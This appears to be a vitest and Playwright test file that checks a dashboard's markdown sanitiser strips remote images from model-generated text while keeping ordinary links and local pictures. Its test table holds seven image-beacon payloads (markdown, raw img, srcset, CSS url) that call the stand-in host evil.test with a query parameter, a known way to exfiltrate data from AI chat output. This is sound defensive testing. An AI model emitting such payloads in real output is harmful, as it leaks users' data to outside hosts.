import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { readFileSync } from 'node:fs';
import { resolve } from 'node:path';
import { chromium, type Browser, type Page } from 'playwright';
import { transformSync } from 'esbuild';
import { marked } from 'marked';

/** The review's payloads, through the renderer's own steps in a real browser: nothing remote survives. */

let browser: Browser; let page: Page;
beforeAll(async () => {
  browser = await chromium.launch();
  page = await browser.newPage();
  await page.addScriptTag({ path: resolve('dashboard/node_modules/dompurify/dist/purify.min.js') });
  const js = transformSync(readFileSync('dashboard/src/components/lab/blocks/safeMarkdown.ts', 'utf-8').replace(/export /g, ''), { loader: 'ts' }).code;
  await page.addScriptTag({ content: `${js}\nwindow.dropRemoteMedia = dropRemoteMedia;` });
}, 60_000);
afterAll(() => browser?.close());

const render = (md: string) => page.evaluate((html) => (window as never as { dropRemoteMedia: (h: string) => string; DOMPurify: { sanitize: (h: string) => string } })
  .dropRemoteMedia((window as never as { DOMPurify: { sanitize: (h: string) => string } }).DOMPurify.sanitize(html)), marked.parse(md) as string);

describe('remote media in model text', () => {
  it.each([
    ['plain', '![x](https://evil.test/?q=S)'],
    ['nested brackets', '![a[b]c](https://evil.test/?q=S)'],
    ['a reference', '![beacon]\n\n[beacon]: https://evil.test/?q=S'],
    ['raw html', '<img src="https://evil.test/?q=S">'],
    ['protocol-relative', '<img src="//evil.test/?q=S">'],
    ['srcset', '<img srcset="https://evil.test/?q=S 2x">'],
    ['a style url', '<span style="background:url&#40;https://evil.test/?q=S)">x</span>'],
  ])('%s', async (_n, md) => expect(await render(md)).not.toContain('evil.test'));
  it('keeps text, links and local pictures', async () => {
    const out = await render('hello [site](https://example.com) ![p](public/a.png)');
    expect(out).toContain('hello');
    expect(out).toContain('https://example.com');
    expect(out).toContain('public/a.png');
  });
});
